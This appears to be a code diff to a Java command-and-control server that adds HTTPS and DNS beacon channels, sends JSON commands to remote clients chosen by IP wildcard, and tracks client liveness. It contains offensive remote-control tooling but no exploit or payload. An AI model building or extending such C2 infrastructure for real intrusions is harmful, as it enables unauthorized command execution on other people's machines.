@@ -10,6 +10,7 @@ import java.security.MessageDigest;
 import java.sql.Time;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Scanner;
 
 import org.json.JSONObject;
@@ -24,7 +25,10 @@ public class C2Server implements Runnable{
 
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
     // Formatted IP Address, Duplexer Pointer
-    private HashMap<String,C2ServerBeaconHandler> longRangeBeacons;
+    private HashMap<String, C2ServerBeaconHandler> longRangeBeacons;
+    private HashMap<String, String> beaconClientDnsMap;
+    private HashMap<String, String> beaconClientHttpsMap;
+    private HashMap<String, Boolean> isBeaconHTTP;
 
     // Dictionaries to Map IP's to Client responses
     private HashMap<String,ArrayList<String>> windowsClientResponses;
@@ -32,6 +36,7 @@ public class C2Server implements Runnable{
 
     // Dictionary to map IP Addresses to time last seen
     private HashMap<String, Time> clientLastSeen;
+    private HashMap<String, Time> dnsClientLastSeen;
 
     // Bionded Server Socket
     private ServerSocket serverSocket;
@@ -81,19 +86,13 @@ public class C2Server implements Runnable{
         this.userInputScanner = new Scanner(System.in);
         this.userMessageList = new HashMap<>();
         this.clientLastSeen = new HashMap<>();
+        this.dnsClientLastSeen = new HashMap<>();
+        this.beaconClientHttpsMap = new HashMap<>();
+        this.beaconClientDnsMap = new HashMap<>();
+        this.isBeaconHTTP = new HashMap<>();
     }
 
-    /**
-     * Whenever a command is issued by the User, this function is used to
-     * Then send the command to the long range beacons individually.
-     * 
-     * @param command Command issued to the long range beacons.
-     */
-    protected void broadcastToBeacons(String command){
-        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
-            beaconHandler.sendToBeacon(command);
-        }
-    }
+    
 
     /**
      * Adds/Changes a username and hashed password in the password hashmap
@@ -168,6 +167,8 @@ public class C2Server implements Runnable{
         }
     }
 
+    
+
     /**
      * Takes in the necessary parameters to run a command on all clients, formats it into a JSON object, and sends it to all of the beacons
      * 
@@ -175,11 +176,25 @@ public class C2Server implements Runnable{
      * @param command - command
      */
     protected void distributeCommandToBeacons(String scope, String command){
-        JSONObject commandJSON = new JSONObject();
-        commandJSON.put("verb", "command");
-        commandJSON.put("scope", scope);
-        commandJSON.put("command", command);
-        broadcastToBeacons(commandJSON.toString());
+        for (String clientIP : getIPMatches(scope)){
+            JSONObject commandJSON = new JSONObject();
+            commandJSON.put("verb", "command");
+            commandJSON.put("scope", clientIP);
+            commandJSON.put("command", command);
+
+            if (beaconClientHttpsMap.keySet().contains(clientIP)){
+                if((System.currentTimeMillis() - clientLastSeen.get(clientIP).getTime()) < 300000){
+                    longRangeBeacons.get(beaconClientHttpsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
+                    return;
+                }
+            } 
+            if (beaconClientDnsMap.keySet().contains(clientIP)){
+                if((System.currentTimeMillis() - dnsClientLastSeen.get(clientIP).getTime()) < 300000){
+                    longRangeBeacons.get(beaconClientDnsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
+                }
+            }
+        }
+        
     }
 
     /**
@@ -347,9 +362,9 @@ public class C2Server implements Runnable{
      * @return All Clients with a matching IP Address
      */
     private ArrayList<String> getIPMatches(String IPAddress){
-        ArrayList<String> matches = new ArrayList<>();
+        HashSet<String> matches = new HashSet<>();
         String octets[] = IPAddress.split("\\.");
-        for(String ip : windowsClientResponses.keySet()){
+        for(String ip : beaconClientHttpsMap.keySet()){
             String clientOctets[] = ip.split("\\.");
             if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
                 (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
@@ -358,7 +373,7 @@ public class C2Server implements Runnable{
                 matches.add(ip);
             }
         }
-        for(String ip : linuxClientResponses.keySet()){
+        for(String ip : beaconClientDnsMap.keySet()){
             String clientOctets[] = ip.split("\\.");
             if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
                 (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
@@ -367,13 +382,12 @@ public class C2Server implements Runnable{
                 matches.add(ip);
             }
         }
-        return matches;
+        return new ArrayList<>(matches);
     }
 
     /**
      * This function will provide the Status (Can the C2 Server still run commands on the clients). Enspired by Ansible Ping
      * 
-     * @param Scope Either "All", "Windows", "Linux", or the IP Address (x.x.x.x) of the Computer of whose status is desired
      * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
      * communicate with the Beacon, False if the client cannot communicate with the Beacon
      */
@@ -395,8 +409,48 @@ public class C2Server implements Runnable{
         return clientStatus;
     }
 
+    /**
+     * This function will provide the Status (Can the C2 Server still run commands on the clients). Enspired by Ansible Ping
+     * 
+     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
+     * communicate with the Beacon, False if the client cannot communicate with the Beacon
+     */
+    protected HashMap<String, Boolean> getDnsClientStatus(){
+        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
+        // True if the client is still active, false if the client is no longer active.
+        HashMap<String, Boolean> clientStatus = new HashMap<>();
+
+        for (String ip : dnsClientLastSeen.keySet()){
+            long currentTime = System.currentTimeMillis();
+            long lastSeenTime = dnsClientLastSeen.get(ip).getTime();
+            if((currentTime - lastSeenTime) < 300000){
+                clientStatus.put(ip, true);
+            } else {
+                clientStatus.put(ip, false);
+            }
+        }
+        
+        return clientStatus;
+    }
+
     protected void updateClientLastSeen(String IPAddress){
         clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
+    }
+
+    protected void updateDnsClientLastSeen(String IPAddress){
+        dnsClientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
+    }
+
+    protected void updateBeaconClientHttpsMap(String clientIP, String beaconIP){
+        beaconClientHttpsMap.put(clientIP, beaconIP);
+    }
+
+    protected void updateBeaconClientDnsMap(String clientIP, String beaconIP){
+        beaconClientDnsMap.put(clientIP, beaconIP);
+    }
+
+    protected void setBeaconHTTP(String IPAddress){
+        isBeaconHTTP.put(IPAddress, true);
     }
     
     @Override
@@ -475,6 +529,7 @@ public class C2Server implements Runnable{
 
                     // Store IP and Duplexer pointer in the dicitonary
                     longRangeBeacons.put(IPAddress, beaconHandler);
+                    isBeaconHTTP.put(IPAddress, false);
 
                     // Start the thread
                     beaconHandlerThread.start();
@@ -487,6 +542,8 @@ public class C2Server implements Runnable{
                 if(sentinel = true){
                     e.printStackTrace();
                 }
+            } catch(Exception e){
+                e.printStackTrace();
             }
         }
     }
